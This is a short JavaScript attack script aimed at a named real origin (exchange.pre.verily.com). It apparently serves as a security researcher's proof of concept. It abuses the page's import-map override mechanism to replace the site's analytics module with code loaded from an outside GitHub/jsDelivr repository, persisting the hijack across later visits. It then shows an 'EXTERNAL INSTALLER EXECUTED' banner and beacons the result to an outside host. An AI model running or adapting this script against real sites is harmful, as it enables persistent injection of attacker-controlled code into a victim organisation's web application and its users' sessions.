(() => {
  "use strict";

  if (location.origin !== "https://exchange.pre.verily.com") return;

  const marker = "north-arch-29b6";
  const moduleName = "@verily-src/analytics";
  const persistentSource =
    "https://cdn.jsdelivr.net/gh/defyourtype/defyourtype.com@bffa050e89595208ea8c34dbbcc5059054ad0c1d/amber-field-64a9.js";

  window.importMapOverrides.addOverride(moduleName, persistentSource);
  window.__exchangeImpactInstaller = {
    marker,
    moduleName,
    persistentSource,
    installed: true,
  };

  const panel = document.createElement("section");
  panel.id = marker;
  panel.innerHTML = `
    <strong style="display:block;font-size:22px;margin-bottom:7px">EXTERNAL INSTALLER EXECUTED</strong>
    <span style="display:block">Origin: ${location.origin}</span>
    <span style="display:block">Persistent attacker module stored for later clean Exchange visits.</span>`;
  Object.assign(panel.style, {
    position: "fixed",
    inset: "14px 14px auto 14px",
    zIndex: "2147483647",
    padding: "20px",
    border: "4px solid #f59e0b",
    borderRadius: "10px",
    background: "#451a03",
    color: "#fffbeb",
    font: "700 16px/1.5 Arial,sans-serif",
    boxShadow: "0 14px 36px rgba(0,0,0,.3)",
  });
  document.body.appendChild(panel);

  const query = new URLSearchParams({
    marker,
    origin: location.origin,
    installed: "true",
    storageKeyPresent: String(
      localStorage.getItem("import-map-override:@verily-src/analytics") !== null,
    ),
  });
  fetch(`https://img.defyourtype.com/r/north-arch-29b6.gif?${query}`, {
    mode: "no-cors",
    credentials: "omit",
    keepalive: true,
  }).catch(() => {});
})();
